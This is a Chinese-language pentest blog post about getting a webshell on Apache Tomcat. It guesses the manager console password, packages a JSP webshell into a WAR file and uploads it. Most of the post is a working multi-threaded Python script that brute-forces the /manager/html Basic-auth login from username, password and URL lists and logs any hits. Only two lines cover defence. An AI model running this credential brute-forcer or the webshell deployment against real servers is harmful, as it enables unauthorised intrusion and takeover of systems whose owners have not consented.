---
draft: false
date: 2016-08-02 22:30:13
title: Tomcat 部署 War 包 getshell
description: 
categories:
  - Pentest
tags:
  - getshell
---

### 0x00 关于 War 包
```
War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
服务器启动时,War包也会随之被解压后自动部署。
```

### 0x01 上传 War 包 GetShell
* 找到后台猜密码然后登录
![70](/img/post/tomcat_vul_background.png)
![40](/img/post/tomcat_vul_login.png)
![30](/img/post/tomcat_vul_war_login_success.png)

* 上传 War 包

运行 jar -cf job.war ./job.jsp 生成 war 包

或者先将 jsp 大马压缩为 zip，再将 zip 后缀改名为 war ，然后上传 war 包

![50](/img/post/tomcot_vul_put_war.png)
![40](/img/post/tomcot_vul_put_war_success.png)
![60](/img/post/tomcot_vul_visit_shell1.png)
![60](/img/post/tomcot_vul_visit_shell2.png)

### 0x02 漏洞防御
* 后台使用强密码
* 删除Tomcat下的manager文件夹

### 0x03 附爆破弱口令代码
```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

import requests
import json
import base64
import sys
import Queue
import threading

"""
简单爆破后台登陆密码
Usage: python tomcat.py username.txt password.txt urlfile.txt
username.txt为用户名字典
password.txt为密码字典
urlfile.txt为后台url列表
"""

def get_username(userfile):
    username = []
    with open(userfile, 'r') as f:
        lines = f.readlines()
        for line in lines:
            username.append(line.strip())
    return username

def get_pwd(passfile):
    password = []
    with open(passfile, 'r') as f:
        lines = f.readlines()
        for line in lines:
            password.append(line.strip())
    return password

def get_url(urlfile):
    urllist = Queue.Queue()
    with open(urlfile,'r') as f:
        lines = f.readlines()
        for line in lines:
            urllist.put(line.strip())
    return urllist

def thread(f,urls,names,pwds):
    while not urls.empty():
        s = requests.Session()
        url = urls.get()
        resp = s.get(url,timeout=10)  #用于记录cookie
        Referer = resp.url

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Referer': Referer,
        }
        bgurl = url + 'manager/html'
        # print bgurl
        for name in names:
            for pwd in pwds:
                authorize = name + ':' + pwd
                Basic = "Basic " + base64.b64encode(authorize)
                headers['Authorization'] = Basic
                # print json.dumps(headers, indent=4)

                proxy = {
                    'http':'http://127.0.0.1:1080'
                }

                resp = s.get(bgurl,headers=headers,proxies=proxy,timeout=10)
                if resp.status_code == 200:
                    s = "[Ok] %s\t%s:%s" % (bgurl,name,pwd)
                    print s
                    f.write(s)
                    exit()
                else:
                    print '[Error] ' + bgurl + '\t' + name + ':' + pwd
            # break

def main():
    if len(sys.argv) < 4:
        print "Usage: python tomcat.py username.txt password.txt urlfile.txt"
        exit()
    userfile = sys.argv[1]
    passfile = sys.argv[2]
    urlfile = sys.argv[3]
    names = get_pwd(userfile)
    pwds = get_pwd(passfile)
    urls = get_url(urlfile)

    tlist = []
    f = open("result.txt","a+")
    for x in xrange(1,50):
        t = threading.Thread(target=thread,args=(f,urls,names,pwds,))
        tlist.append(t)
    for t in tlist:
        t.start()
    t.join()

main()
```